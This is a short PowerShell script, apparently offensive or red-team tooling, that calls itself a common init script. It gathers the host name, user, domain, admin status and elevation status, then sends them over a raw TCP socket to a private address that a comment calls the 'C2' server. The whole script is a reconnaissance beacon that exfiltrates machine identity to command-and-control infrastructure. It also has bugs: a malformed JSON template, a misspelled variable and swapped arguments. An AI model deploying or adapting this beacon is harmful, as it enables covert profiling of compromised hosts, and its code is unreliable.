#
# init.ps1 is a common Powershell script that is used to gather initial details
#

# Define arguments
param($stage="Init", $state="Unknown")

# Define session variables
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$domain = $env:USERDOMAIN
$timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssK"
$init_message = "[{0}] Hostname: {1}, Username: {2}\{3}, Admin: {4}, Elevated: {5}, Stage: {6}, State: {7}"
$init_message_json = '{{"timestamp": "{0}, "hostname": "{1}", "username": "{2}\{3}", "admin": {4}, "elevated": {5}, "stage": "{6}", "state": "{7}"}}'

# Determine if this is an admin user, and if this session is elevated
$admin_user = ($username -split "-")[1]

if ($admin_user -ne $null)
{
  $is_admin = $true
  $is_elevated = [bool]([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
} else
{
  $is_admin = $false
  $is_elevated = [bool]([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
}

# Debug output
#write-host('')
#write-host($init_message -f $timestamp, $hostname, $domain, $username, $is_admin, $is_elevated, $stage, $state)
#write-host('')
$json__message = ($init_message_json -f $timestamp, $hostname, $domain, $username, $is_admin, $is_elevated, $stage, $state | convertto-json | convertfrom-json)
$tcp_message = [text.Encoding]::ASCII.GetBytes($json__message)
write-host('')

# Create TCP socket to C2 and send $tcp_message
$logserver = "172.16.100.253"
$logport = 8443

$socket = New-Object System.Net.Sockets.TcpClient($logserver, $logport)
$stream = $socket.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)

start-sleep -m 500
Write-Host('Sending message: {0}' -f $tcp__message)
$writer.Writeline($tcp_message)
$writer.Flush()

$writer.Close()
$stream.Close()
$socket.Close()